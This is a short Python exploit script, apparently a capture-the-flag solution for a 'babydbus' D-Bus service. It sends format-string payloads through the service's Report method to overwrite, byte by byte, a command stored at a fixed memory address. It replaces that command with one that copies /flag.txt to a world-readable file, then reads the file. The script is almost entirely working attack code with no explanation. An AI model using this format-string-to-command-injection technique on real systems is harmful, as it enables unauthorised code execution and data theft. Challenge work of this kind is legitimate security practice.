#!/usr/bin/python3

from dbus.bus import BusConnection
import dbus
import struct
import time

conn = BusConnection('unix:path=/tmp/dbus.socket')

SERVICE='org.babydbus.MyServer'
OBJECT='/babydbus/MyServer'
INTERFACE='org.babydbus.MyServer'

get_proxy = lambda: conn.get_object(SERVICE, OBJECT, introspect=True)
encode = lambda x: b''.join(bytes([x]) if 32 <= x <= 126 and x != 0x25 else b'%%%02x' % x for x in x)

proxy = get_proxy()

# Exploit
interface = dbus.Interface(proxy, INTERFACE)
properties = dbus.Interface(proxy, "org.freedesktop.DBus.Properties")

# Modify sync_command
cmd = 'cat /flag.txt > /tmp/pwned; chmod 0777 /tmp/pwned'
for i in range(len(cmd)):
    interface.Report(encode(b'%' + str(ord(cmd[i]) + 256 - 13).encode() + b'c%16$hhn').ljust(31) + encode(struct.pack("<Q", 0x40a3c0 + i)))

time.sleep(5)
print(list(open("/tmp/pwned")))